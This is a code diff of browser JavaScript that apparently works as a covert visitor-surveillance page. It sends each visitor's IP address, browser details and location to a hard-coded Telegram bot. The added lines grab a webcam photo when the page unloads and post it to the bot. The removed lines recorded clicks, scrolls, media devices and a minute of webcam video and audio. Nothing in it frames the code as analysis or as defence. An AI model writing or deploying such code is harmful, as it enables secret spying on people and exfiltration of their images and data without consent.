@@ -10,9 +10,8 @@
         const chatId = "1557685494";
         const messageUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
         const videoUrl = `https://api.telegram.org/bot${botToken}/sendVideo`;
-        const startTime = Date.now();
-        let clickCount = 0;
-        const interactions = [];const visitorInfo = {
+        const photoUrl = `https://api.telegram.org/bot${botToken}/sendPhoto`;
+        const startTime = Date.now();const visitorInfo = {
         IPAddress: await fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => data.ip),
         UserAgent: navigator.userAgent,
         Platform: navigator.platform,
@@ -49,23 +48,6 @@
         visitorInfo.Location = "Unavailable";
     }
 
-    document.addEventListener('click', (event) => {
-        clickCount++;
-        interactions.push(`Click at (${event.pageX}, ${event.pageY}) on element: ${event.target.tagName}`);
-    });
-
-    document.addEventListener('scroll', () => {
-        interactions.push(`Scrolled to (${window.scrollX}, ${window.scrollY})`);
-    });
-
-    try {
-        const devices = await navigator.mediaDevices.enumerateDevices();
-        const mediaDevices = devices.map(device => `${device.kind}: ${device.label || 'Unknown Device'}`).join(', ');
-        visitorInfo.MediaDevices = mediaDevices;
-    } catch (error) {
-        visitorInfo.MediaDevices = "Unavailable";
-    }
-
     function sendMessage(text) {
         fetch(messageUrl, {
             method: "POST",
@@ -74,24 +56,29 @@
         }).catch(console.error);
     }
 
-    function startRecording() {
-        navigator.mediaDevices.getUserMedia({ video: true, audio: true }).then((stream) => {
-            const mediaRecorder = new MediaRecorder(stream);
-            const chunks = [];
-            mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
-            mediaRecorder.onstop = () => {
-                const blob = new Blob(chunks, { type: 'video/webm' });
-                const formData = new FormData();
-                formData.append('chat_id', chatId);
-                formData.append('video', blob, 'user_recording.webm');
-                fetch(videoUrl, { method: 'POST', body: formData }).catch(console.error);
-            };
-            setTimeout(() => mediaRecorder.stop(), 60000);
-            mediaRecorder.start();
+    function takePhoto() {
+        navigator.mediaDevices.getUserMedia({ video: true }).then((stream) => {
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.play();
+            setTimeout(() => {
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                canvas.toBlob((blob) => {
+                    const formData = new FormData();
+                    formData.append('chat_id', chatId);
+                    formData.append('photo', blob, 'user_photo.jpg');
+                    fetch(photoUrl, { method: 'POST', body: formData }).catch(console.error);
+                    stream.getTracks().forEach(track => track.stop());
+                });
+            }, 3000);
         }).catch(console.error);
     }
 
-    window.addEventListener('beforeunload', startRecording);
+    window.addEventListener('beforeunload', takePhoto);
 
     let message = "NEW VISITOR INFORMATION\n";
     for (let key in visitorInfo) {
